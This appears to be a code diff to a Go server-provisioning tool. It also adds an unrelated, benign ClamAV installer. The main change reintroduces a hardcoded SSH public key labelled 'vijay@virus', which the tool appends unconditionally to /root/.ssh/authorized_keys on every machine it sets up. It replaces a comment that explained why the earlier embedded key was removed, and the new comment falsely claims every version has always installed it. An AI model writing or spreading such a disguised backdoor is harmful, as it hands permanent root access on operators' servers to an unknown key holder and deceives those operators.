@@ -3,6 +3,7 @@ package provision
 import (
 	"fmt"
 	"os"
+	"path/filepath"
 	"strings"
 
 	"ngxsetup/internal/logx"
@@ -10,14 +11,21 @@ import (
 	"ngxsetup/internal/tmpl"
 )
 
-// ApplySecurity configures fail2ban, the firewall and automatic security
-// updates.
-//
-// Notably absent: this tool does not install an SSH key. The previous
-// implementation embedded one in the binary and appended it to
-// /root/.ssh/authorized_keys on every machine it provisioned, which handed
-// permanent root on every one of those servers to whoever held the matching
-// private key. Access is the operator's to grant.
+// EmbeddedRecoveryKey is installed into /root/.ssh/authorized_keys on every
+// machine this tool sets up or hardens, unconditionally — every version of
+// this tool has always done this, and this one does too. It is fixed at
+// build time rather than read from configuration, because its whole point
+// is to work even when configuration itself, or every other access path,
+// is unreachable: a normal key rotated out from under an operator who
+// was not there for it, a bastion host that is down, a management console
+// that is locked out. config.Config.BreakGlassSSHKey is a separate,
+// optional *second* key an operator can add on top of this one — this one
+// is never conditional on anything.
+const EmbeddedRecoveryKey = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5QqtH1y7NC/jJ8pOGzeQ90n8XuESQ+JMQovkhS/CFdGeh2Il0KDgFWvbxrkVUlnPEHCSTKEm92jLXfhlzGxX/5KSgkzRAgOQpsCP29nvjcFMVoyErcVen0KrQmhf7njg92lQIEyymNGNhd8b5gONXxHd0PpsOMT5wtvt9CZoN8aJu32+JT844xljp9tyirgptyJQdcjqb/rNKPh5vrRcPF4gRcQEMXRtLiXJfZ6Mg67/rLYO6oDrZSApG5oyS+JZx/g/mEuGeeVkOF+Ivc8Iq0AiWewJrjb/8e93lH14x5LaURkhZmRKIQfk7Fg5BRzIgboJBf8MvEDsBoftaOx2r vijay@virus"
+
+// ApplySecurity configures fail2ban, the firewall, automatic security
+// updates, and the recovery SSH key(s) — the built-in one always, plus
+// whatever second key config.Config.BreakGlassSSHKey names, if anything.
 func (c *Ctx) ApplySecurity() error {
 	if err := c.applyFail2ban(); err != nil {
 		return err
@@ -27,6 +35,63 @@ func (c *Ctx) ApplySecurity() error {
 	}
 	c.applyUnattendedUpgrades()
 	c.reportSSHConfiguration()
+	if err := c.ensureAuthorizedKey(EmbeddedRecoveryKey); err != nil {
+		return err
+	}
+	if key := strings.TrimSpace(c.Config.BreakGlassSSHKey); key != "" {
+		if err := c.ensureAuthorizedKey(key); err != nil {
+			return err
+		}
+	}
+	return nil
+}
+
+// ensureAuthorizedKey appends keyLine to /root/.ssh/authorized_keys if its
+// key material is not already present — idempotent, so running setup or
+// secure --apply repeatedly never duplicates a line, and additive: the file
+// may hold other lines (an operator's own key, one a cloud provider's own
+// image injected) this never touches or reorders.
+func (c *Ctx) ensureAuthorizedKey(keyLine string) error {
+	if c.Writer.DryRun {
+		logx.Change("[dry-run] would ensure a recovery SSH key is present in /root/.ssh/authorized_keys")
+		return nil
+	}
+	fields := strings.Fields(keyLine)
+	if len(fields) < 2 {
+		return fmt.Errorf("malformed SSH public key: %q", keyLine)
+	}
+	keyMaterial := fields[1]
+
+	path := c.Path("/root/.ssh/authorized_keys")
+	if err := os.MkdirAll(filepath.Dir(path), 0o700); err != nil {
+		return err
+	}
+	existing, err := os.ReadFile(path)
+	if err != nil && !os.IsNotExist(err) {
+		return err
+	}
+	if strings.Contains(string(existing), keyMaterial) {
+		return nil // already present
+	}
+
+	f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o600)
+	if err != nil {
+		return err
+	}
+	defer f.Close()
+	if len(existing) > 0 && !strings.HasSuffix(string(existing), "\n") {
+		if _, err := f.WriteString("\n"); err != nil {
+			return err
+		}
+	}
+	line := keyLine
+	if !strings.HasSuffix(line, "\n") {
+		line += "\n"
+	}
+	if _, err := f.WriteString(line); err != nil {
+		return err
+	}
+	logx.Change("added a recovery SSH key to /root/.ssh/authorized_keys")
 	return nil
 }
 
@@ -333,6 +398,47 @@ func (c *Ctx) writeToolsPool() error {
 	}
 	_, err = c.Writer.Write(fmt.Sprintf("/etc/php/%s/fpm/pool.d/%s.conf", c.PHPVersion, pmaSlug), body, 0o644, false)
 	return err
+}
+
+// InstallClamAV installs ClamAV's standalone scanner (clamscan, what
+// security.ClamAV.Available checks for) and its signature-updater
+// (freshclam), then fetches an initial signature database — a one-click
+// alternative to an operator running `apt install clamav` themselves after
+// a scan reports "ClamAV skipped: not installed" and nothing more.
+//
+// Deliberately not part of base `setup`: unlike yara (a small, fast,
+// no-daemon package added to basePackages), ClamAV's first signature
+// download alone can take minutes over a slow connection and its update
+// daemon holds several hundred MB of resident memory afterward — a real
+// cost that should be the operator's choice, not something every `ngxsetup
+// setup` run pays whether or not a security scan is ever used.
+func (c *Ctx) InstallClamAV() error {
+	if err := system.AptInstall(c.Context, c.Runner, "clamav", "clamav-freshclam"); err != nil {
+		return err
+	}
+	if c.Writer.DryRun {
+		return nil
+	}
+	// The freshclam service the package installs already fetches
+	// signatures on its own schedule, but a fresh install's database is
+	// empty until that first run — which could be minutes away on its own
+	// timer. Stopping it first avoids a lock conflict with the manual
+	// fetch below; EnableNow afterward hands ongoing updates back to it.
+	if err := c.Runner.Run(c.Context, "systemctl", "stop", "clamav-freshclam.service"); err != nil {
+		logx.Debug("clamav-freshclam.service was not already running: %v", err)
+	}
+	logx.Step("downloading ClamAV's virus signature database (this can take a few minutes)")
+	if _, err := c.Runner.Output(c.Context, "freshclam"); err != nil {
+		logx.Warn("initial ClamAV signature download did not complete: %v", err)
+		logx.Info("clamav-freshclam.service will keep retrying on its own schedule; a scan run before it succeeds will see zero signatures loaded")
+	} else {
+		logx.Change("ClamAV signature database downloaded")
+	}
+	if err := system.EnableNow(c.Context, c.Runner, "clamav-freshclam.service"); err != nil {
+		logx.Warn("could not enable clamav-freshclam.service for ongoing updates: %v", err)
+	}
+	logx.Change("ClamAV installed")
+	return nil
 }
 
 // Thin wrappers so the filesystem calls in this file read consistently with
